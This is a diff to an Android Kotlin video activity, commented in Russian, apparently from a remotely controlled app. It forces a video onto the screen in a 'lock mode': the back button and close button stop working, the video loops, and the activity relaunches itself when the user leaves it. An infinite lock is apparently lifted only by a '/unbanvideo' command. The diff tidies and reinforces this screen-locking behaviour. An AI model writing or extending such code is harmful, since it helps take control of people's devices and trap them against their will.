@@ -36,13 +36,13 @@ class VideoActivity : AppCompatActivity() {
     private var videoUrl: String? = null
     private var lockMode: Boolean = false
     private var duration: Int = 0
+    private var secondsWatched = 0
+    private var watchTimer: Job? = null
+    private var canClose = false
 
     private var surfaceReady = false
     private var videoReady = false
     private var videoFile: File? = null
-    private var secondsWatched = 0
-    private var watchTimer: Job? = null
-    private var canClose = false
 
     companion object {
         private const val TAG = "VideoActivity"
@@ -85,7 +85,11 @@ class VideoActivity : AppCompatActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        window.setFlags(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE)
+
+        window.setFlags(
+            WindowManager.LayoutParams.FLAG_SECURE,
+            WindowManager.LayoutParams.FLAG_SECURE
+        )
 
         window.addFlags(
             WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
@@ -112,6 +116,7 @@ class VideoActivity : AppCompatActivity() {
 
         if (lockMode) lockActive = true
 
+        // Если таймер уже вышел
         if (duration > 0 && secondsWatched >= duration) {
             canClose = true
             lockActive = false
@@ -124,7 +129,8 @@ class VideoActivity : AppCompatActivity() {
 
     override fun onStop() {
         super.onStop()
-        if (lockActive && !canClose) {
+        if (lockMode && !canClose) {
+            // Блокировка активна и таймер не вышел — перезапускаем
             handler.postDelayed({
                 if (lockActive && !canClose) {
                     val videoNum = intent.getIntExtra(EXTRA_VIDEO_NUM, 0)
@@ -135,7 +141,15 @@ class VideoActivity : AppCompatActivity() {
                     }
                 }
             }, 400L)
+        } else {
+            // Блокировки нет или таймер вышел — убираем из недавних
+            finishAndRemoveTask()
         }
+    }
+
+    private fun closeVideo() {
+        lockActive = false
+        finishAndRemoveTask()
     }
 
     private fun buildUI() {
@@ -177,10 +191,7 @@ class VideoActivity : AppCompatActivity() {
             alpha = if (canClose) 1f else 0f
             setPadding(24, 24, 24, 24)
             setOnClickListener {
-                if (canClose) {
-                    lockActive = false
-                    finishAndRemoveTask()
-                }
+                if (canClose) closeVideo()
             }
         }
         root.addView(closeButton, FrameLayout.LayoutParams(120, 120, Gravity.TOP or Gravity.END).apply {
@@ -218,16 +229,16 @@ class VideoActivity : AppCompatActivity() {
             mediaPlayer!!.setOnVideoSizeChangedListener { _, w, h -> adjustSurfaceSize(w, h) }
             mediaPlayer!!.setOnCompletionListener {
                 if (lockMode && !canClose) {
+                    // Зацикливаем
                     mediaPlayer?.seekTo(0)
                     mediaPlayer?.start()
                 } else {
-                    lockActive = false
-                    finishAndRemoveTask()
+                    closeVideo()
                 }
             }
             mediaPlayer!!.setOnErrorListener { _, what, extra ->
                 Log.e(TAG, "MediaPlayer error: $what extra=$extra")
-                finishAndRemoveTask()
+                closeVideo()
                 true
             }
             mediaPlayer!!.prepare()
@@ -237,7 +248,7 @@ class VideoActivity : AppCompatActivity() {
 
         } catch (e: Exception) {
             Log.e(TAG, "tryPlay failed: ${e.message}", e)
-            finishAndRemoveTask()
+            closeVideo()
         }
     }
 
@@ -245,6 +256,7 @@ class VideoActivity : AppCompatActivity() {
         watchTimer?.cancel()
 
         if (duration == 0 && !lockMode) {
+            // Без блокировки — крестик через 3 сек
             handler.postDelayed({
                 canClose = true
                 showCloseButton()
@@ -253,9 +265,11 @@ class VideoActivity : AppCompatActivity() {
         }
 
         if (duration == 0 && lockMode) {
+            // Бесконечная блокировка — только /unbanvideo
             return
         }
 
+        // Считаем секунды с учётом уже просмотренных
         watchTimer = scope.launch {
             while (secondsWatched < duration) {
                 delay(1000)
@@ -339,7 +353,7 @@ class VideoActivity : AppCompatActivity() {
                 Log.e(TAG, "Download failed: ${e.message}", e)
                 handler.post { statusText.text = "Ошибка: ${e.message}" }
                 delay(3000)
-                handler.post { finishAndRemoveTask() }
+                handler.post { closeVideo() }
             }
         }
     }
@@ -357,10 +371,8 @@ class VideoActivity : AppCompatActivity() {
     }
 
     override fun onBackPressed() {
-        if (canClose) {
-            lockActive = false
-            super.onBackPressed()
-        }
+        if (canClose) closeVideo()
+        // Если нельзя закрыть — блокируем
     }
 
     override fun onDestroy() {
@@ -369,7 +381,6 @@ class VideoActivity : AppCompatActivity() {
         scope.cancel()
         try { mediaPlayer?.apply { if (isPlaying) stop(); release() } } catch (e: Exception) { }
         mediaPlayer = null
-        finishAndRemoveTask()
         super.onDestroy()
     }
 }
